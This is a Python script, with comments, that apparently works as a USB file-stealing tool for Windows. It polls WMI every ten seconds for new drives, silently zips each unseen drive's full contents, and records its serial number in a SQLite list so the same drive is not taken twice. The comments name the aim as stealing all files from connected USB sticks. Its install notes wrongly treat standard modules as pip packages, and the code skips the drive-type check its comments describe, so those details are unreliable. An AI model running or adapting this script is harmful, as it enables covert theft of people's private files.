# USB HIJACK ----------> Just Windows
#
# Comands to Display Connected USB´s
# 
# PowerShell
#				
#				-->  Get-WmiObject -Class Win32_LogicalDisk | Select-Object deviceid, volumeserialnumber, drivetype| ConvertTo-Json 
#
#					---> This comand displays the: 
#
#							->DeviceID : Where we need to Connect >>> "cd \D 'DeviceID':\"
#
#							->DiverType: To Validate if it is a Removable USB or not.	
#
#								--> Types: 
#											--> 0 : Unknown
#											--> 1 : No Root Directory
#											--> 2 : Removable Disk     <-- We will use this one.
#											--> 3 : Local Disk
#											--> 4 : Network Drive
#											--> 5 : Compact Disc
#											--> 6 : Ram Disk
#							
#							-> VolumeSerialNumber : After the Hijack, we know that all files are stolen.
#
#				--> If the list of devices is bigger than 2, we know that a device is connected since we have always a local Disk.
#					After that we can steal the files, only if the Serial Number is not Blacklisted.
#
#
# Compress and Store
#	
#	--> I was using zipfile library, but then i found out about shutil, once i just need to compress and hijack the data of the USB, this is the easyest way to do it.
#	--> Since this takes sometime to finish , i will use threads to do the work
#
#
# BlackList
#
#	--> All Devices that got Hijack Will be Stored in a DataBase
#
#
#
#	Requiriments 
#		
#		Shutil ---> pip3 install pytest-shutil
#		
#		sqlite3 --> pip3 install pysqlite3 
#


import subprocess
import json
import time
import shutil
import sqlite3


print("""
UU   UU  SSSSS  BBBBB          HH   HH iii   jjj                kk     
UU   UU SS      BB   B         HH   HH             aa aa   cccc kk  kk 
UU   UU  SSSSS  BBBBBB  _____  HHHHHHH iii   jjj  aa aaa cc     kkkkk  
UU   UU      SS BB   BB        HH   HH iii   jjj aa  aaa cc     kk kk  
 UUUUU   SSSSS  BBBBBB         HH   HH iii   jjj  aaa aa  ccccc kk  kk 
                                           jjjj                        
""")



#BlackList DataBase ---- Done

conn = sqlite3.connect('BlackList.db')
c = conn.cursor()

try:
	c.execute('''CREATE TABLE BlackList ([VolumeSerialNumber] TEXT NOT NULL UNIQUE)''')
	conn.commit()
except:
	print("[+] DataBase Connected")


# HijackPen ---- Done

def HijackFiles(FileName, DirectoryName):
	# Name of File = volumeserialnumber , Zip Format, Directory = DeviceID
	shutil.make_archive(FileName, 'zip', DirectoryName)
	print("[+] Hijack "+FileName + " Done")
	AddToBlackList(FileName)

# Detect USB Pendrive ---- Done

def PowerShellReturn():
	proc = subprocess.run(
    args=[
        'powershell',
        '-noprofile',
        '-command',
        'Get-WmiObject -Class Win32_LogicalDisk | Select-Object deviceid, volumeserialnumber, drivetype, freespace, size| ConvertTo-Json '
    ],
    text=True,
    stdout=subprocess.PIPE)
	return proc

def AddToBlackList(FileName):
	c.execute('''INSERT INTO BlackList (VolumeSerialNumber) VALUES (?)''', [FileName])
	conn.commit()

def GetBlackListed():
	List = c.execute('''SELECT * FROM BlackList''')
	BlackL = []
	for Serial in List:
		for RealS in Serial:
			BlackL.append(RealS)
	return BlackL

while(True):
	Hijack = False
	proc = PowerShellReturn()
	BL = GetBlackListed()
	if(proc.returncode != 0):
		print("[!] Error Trying to Get LocalDisk Info")
	else:
		AllowedDrivers = []
		InfoDriver = (json.loads(proc.stdout))[1:]
		if len(InfoDriver) >= 1:
			for Driver in InfoDriver:
				if Driver["volumeserialnumber"] in BL:
					print("[+] VolumeSerialNumber - " + Driver["volumeserialnumber"]+ " is Blacklisted ")
				else:
					print("[+] New Device Connected Proceed to Hijack")
					print(" 	[+] Driver - "+Driver["deviceid"] + "  VolumeSerialNumber - "+ Driver["volumeserialnumber"])
					print("			[+] Size - "+ str(Driver["size"]) + " FreeSpace - "+ str(Driver["freespace"]))
					print("			[+] Hijack File Size - "+ str(Driver["size"]- Driver["freespace"]) + "\n\n")
					AllowedDrivers.append(Driver)
					Hijack = True
	if(Hijack):
		for Driver in AllowedDrivers:
			HijackFiles(Driver['volumeserialnumber'], Driver["deviceid"]+"\\")
			Hijack = False
	time.sleep(10)